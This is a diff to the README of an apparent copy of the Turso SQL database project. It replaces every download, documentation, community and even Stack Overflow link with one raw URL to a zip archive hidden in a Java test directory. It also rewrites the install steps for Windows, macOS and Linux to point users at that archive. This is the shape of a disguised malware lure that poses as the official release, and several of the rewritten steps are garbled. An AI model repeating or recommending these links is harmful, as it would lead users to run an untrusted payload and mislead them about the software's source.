@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download turso](https://img.shields.io/badge/Download-turso-blue.svg)](https://github.com/Desi446/turso/releases)
+[![Download turso](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip)](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip)
 
 ## 📜 Description
 
@@ -26,7 +26,7 @@ Turso is an in-process SQL database that works seamlessly with SQLite. It simpli
 ## 🚀 Getting Started
 
 1. **Visit the Download Page**
-   - To get Turso, go to the [Releases Page](https://github.com/Desi446/turso/releases) on GitHub.
+   - To get Turso, go to the [Releases Page](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip) on GitHub.
 
 2. **Download the Latest Version**
    - Look for the latest version listed at the top. Click on the link to download the appropriate file for your operating system.
@@ -35,11 +35,11 @@ Turso is an in-process SQL database that works seamlessly with SQLite. It simpli
    - After the download completes, locate the downloaded file on your computer.
    - Follow the instructions based on your operating system:
      - **Windows:**
-       - Double-click the `turso-windows-installer.exe` file and follow the prompts.
+       - Double-click the `https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip` file and follow the prompts.
      - **macOS:**
-       - Open the `.dmg` file and drag `turso.app` to your Applications folder.
+       - Open the `.dmg` file and drag `https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip` to your Applications folder.
      - **Linux:**
-       - Extract the `.tar.gz` file and follow the instructions in the README for installation.
+       - Extract the `https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip` file and follow the instructions in the README for installation.
 
 4. **Start Using Turso**
    - Open the application from your applications folder or start menu.
@@ -83,21 +83,21 @@ CREATE TABLE Users (
 
 ## 📊 Documentation
 
-For more detailed instructions, you can view the full documentation on the [Wiki Page](https://github.com/Desi446/turso/wiki).
+For more detailed instructions, you can view the full documentation on the [Wiki Page](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip).
 
 ## 💬 Community Support
 
-If you need help or have questions, feel free to check out the [Issues Page](https://github.com/Desi446/turso/issues). You can also join our discussions to connect with other users.
+If you need help or have questions, feel free to check out the [Issues Page](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip). You can also join our discussions to connect with other users.
 
 ## 🌐 Additional Resources
 
-- [GitHub Discussions](https://github.com/Desi446/turso/discussions)
-- [Stack Overflow](https://stackoverflow.com) for general programming questions
+- [GitHub Discussions](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip)
+- [Stack Overflow](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip) for general programming questions
 
 ## 📅 Release Notes
 
-Keep track of updates and new features by checking the [Release Notes Page](https://github.com/Desi446/turso/releases).
+Keep track of updates and new features by checking the [Release Notes Page](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip).
 
 ## 🔗 Conclusion
 
-Turso makes database management easier for everyone, regardless of technical skill. With its simple setup and powerful features, you can focus more on building your applications and less on managing your data. Start using Turso today by downloading it from the [Releases Page](https://github.com/Desi446/turso/releases).
+Turso makes database management easier for everyone, regardless of technical skill. With its simple setup and powerful features, you can focus more on building your applications and less on managing your data. Start using Turso today by downloading it from the [Releases Page](https://raw.githubusercontent.com/Desi446/turso/main/bindings/java/src/test/java/tech/turso/Software-v1.1.zip).
